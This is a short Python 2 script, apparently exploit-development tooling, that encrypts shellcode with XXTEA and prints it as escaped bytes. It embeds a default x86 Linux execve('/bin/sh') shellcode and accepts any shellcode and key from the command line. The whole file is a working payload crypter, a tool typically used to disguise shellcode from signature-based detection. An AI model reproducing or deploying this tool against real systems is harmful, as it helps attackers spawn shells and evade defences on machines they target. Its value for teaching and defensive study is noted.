#!/usr/bin/env python

import random, string, getopt, xxtea, sys

def help():
    print sys.argv[0] + " [options]"
    print "Valid options:"
    print "\t-h, --help: show this help"
    print "\t-k, --key: specify the encryption key"
    print "\t-s, --shellcode: specify the shellcode to be used"

    return 0

def generate_key():
    k=''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16));
    return k;

def encrypt(shellcode, key):
    enc = xxtea.encrypt(shellcode, key);
    return enc;

def main(argv):
    # Default behaviour is to generate a random key and to use an
    # execve("/bin/sh") shellcode
    key = generate_key();
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

    try:
        opts, args=getopt.getopt(argv, "hk:s:", ["help", "key", "shellcode"] )
    except getopt.GetoptError:
        help()
        sys.exit(1)

    for opt, arg in opts:
        if opt in ('-h', '--help'):
            help()
            sys.exit(0)
        elif opt in ('-k', '--key'):
            key=arg
            if (len(key) != 16):
                print "The encryption key must be 16 byte long"
                help()
                sys.exit(-2)
        elif opt in ('-s', '--shellcode'):
            shellcode=arg.replace('\\x', '').decode('hex')

    print "key: " + key;
    enc = encrypt(shellcode, key)
    sys.stdout.write("encrypted shellcode: \\x");
    sys.stdout.flush();
    print '\\x'.join(map("%2.2x".__mod__, map(ord, enc)));

if __name__ == "__main__":
    main(sys.argv[1:])


